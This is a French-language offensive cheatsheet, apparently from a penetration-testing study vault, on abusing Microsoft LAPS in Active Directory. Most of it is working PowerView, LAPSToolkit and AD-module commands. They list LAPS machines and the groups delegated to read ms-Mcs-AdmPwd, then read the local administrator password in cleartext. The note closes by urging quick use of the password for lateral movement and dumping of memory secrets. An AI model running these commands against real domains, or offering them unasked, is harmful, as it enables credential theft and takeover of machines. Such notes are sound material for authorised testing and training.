# Cheatsheet - LAPS

> [!summary] Objectif
> LAPS (Local Administrator Password Solution) stocke le mot de passe administrateur local de chaque machine dans l'attribut `ms-Mcs-AdmPwd` de l'objet computer — en clair, mais protégé par ACL. Intérêt offensif : là où l'on a le droit de lecture (souvent un groupe IT/support délégué), on récupère le mot de passe admin local **en clair** → accès admin immédiat sur la machine, sans hash ni crack. Le vrai levier : énumérer *qui* peut lire, ce qui donne une liste de cibles à haute valeur.

> [!warning]- Required
> Un droit de lecture sur `ms-Mcs-AdmPwd` de la machine visée (ExtendedRight / ReadProperty), généralement accordé à un groupe délégué. Se repère via [[Cheatsheet - ACL et droits AD]] ou BloodHound.

### Repérer les machines LAPS et qui peut lire

```powershell
. C:\AD\Tools\PowerView.ps1
# machines gérées par LAPS (attribut d'expiration présent)
Get-DomainComputer -Properties name,ms-mcs-admpwdexpirationtime | ? {$_.'ms-mcs-admpwdexpirationtime'}

# LAPSToolkit : machines LAPS + groupes délégués autorisés à lire
. C:\AD\Tools\LAPSToolkit.ps1
Get-LAPSComputers
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
```

`Find-AdmPwdExtendedRights` liste, par machine, les principals autorisés à lire le mot de passe — ce sont les cibles. Compromettre un membre du groupe délégué ouvre toutes les machines qu'il couvre.

### Lire le mot de passe admin local

```powershell
# PowerView
Get-DomainComputer -Identity <computer> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd

# Module Active Directory (signé, passe en Constrained Language Mode)
Get-ADComputer -Identity <computer> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

Le mot de passe renvoyé est en clair → connexion admin local directe (`winrs`, PSRemoting) sans Pass-the-Hash.

> [!note] Après lecture
> Utiliser le mot de passe pour un accès admin local ([[Cheatsheet - Lateral movement]]), puis dumper les secrets en mémoire ([[Cheatsheet - Post-exploitation]]). Le mot de passe tourne périodiquement (`ms-mcs-admpwdexpirationtime`) — l'exploiter vite.

**Link**
- [[Cheatsheet - ACL et droits AD]]
- [[Cheatsheet - Lateral movement]]
- [[Cheatsheet - Post-exploitation]]
- [[Synthèse - Énumération]]
